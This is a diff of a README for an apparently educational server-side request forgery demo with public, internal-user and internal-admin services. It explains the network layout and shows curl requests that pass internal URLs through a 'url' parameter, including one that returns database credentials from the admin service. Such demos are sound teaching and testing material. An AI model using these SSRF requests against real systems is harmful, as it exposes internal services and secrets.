@@ -35,26 +35,18 @@ We have created three service for demo purpose
 2. **internal-user-service** : This service is not exposed to internet but the resources can be accessible by **public web server**
 3. **internal-admin-service** : This service is not exposed to internet. Attacker will try to access this service and retrive sensitive data by ssrf attack.
 
-In a internal user service, we have a userdetails endpoint which will provide user related basic information.
+![Private server](SSRF_new.jpg)
 
-### Get User Information
-```java
-curl http://localhost:8080/api/users?url=http://localhost:8081/api/userDetail/0
-```
-### Response
-```json
-{'name':'User-0','id':'0'}
-```
+To explain the impact, 
+consider that the server we’re running with our (IP address 10.0.0.3) is within a network with another server: internal-admin-service (IP address 10.0.0.2). 
+The internal-admin-service server serves a site on port 8083 without any authentication. 
+The router (10.0.0.1) routes all the internal traffic to the internet. 
+For this example, there aren’t any firewall rules for traffic between internal servers. 
 
-### Get User Address
-```java
-curl http://localhost:8080/api/users?url=http://localhost:8081/api/userAddress/0
-```
+The internal-admin-service server cannot be reached from the internet. The public web server can be reached at web-server.com.
 
-### Response
-```json
-{'address':'Ahmedabad, India','id':'0'}
-```
+We know that our web server, 10.0.0.3, processes the requests we send to it. 
+Now let’s see what happens when we request the internal-admin-service server through the web server:
 
 # Attack
 
@@ -78,6 +70,31 @@ curl http://localhost:8080/api/users?url=http://localhost:8083/api/dbDetail
 
 ```json
 {'dbName':'controller','host':'10.0.1.35','username':'root', 'password':'XSuper@#12345', 'port':'5432'}
+```
+
+Since the public web server can actually reach 10.0.0.2, the internal internal-admin-service server, it’ll send an HTTP request to it and then reflect the response to the outside world. 
+You could compare it to a web proxy, but abused to proxy external traffic to internal services and vica versa.
+
+
+In a internal user service, we have a userdetails endpoint which will provide user related basic information.
+
+### Get User Information
+```java
+curl http://localhost:8080/api/users?url=http://localhost:8081/api/userDetail/0
+```
+### Response
+```json
+{'name':'User-0','id':'0'}
+```
+
+### Get User Address
+```java
+curl http://localhost:8080/api/users?url=http://localhost:8081/api/userAddress/0
+```
+
+### Response
+```json
+{'address':'Ahmedabad, India','id':'0'}
 ```
 
 curl localhost:8080/management/mappings
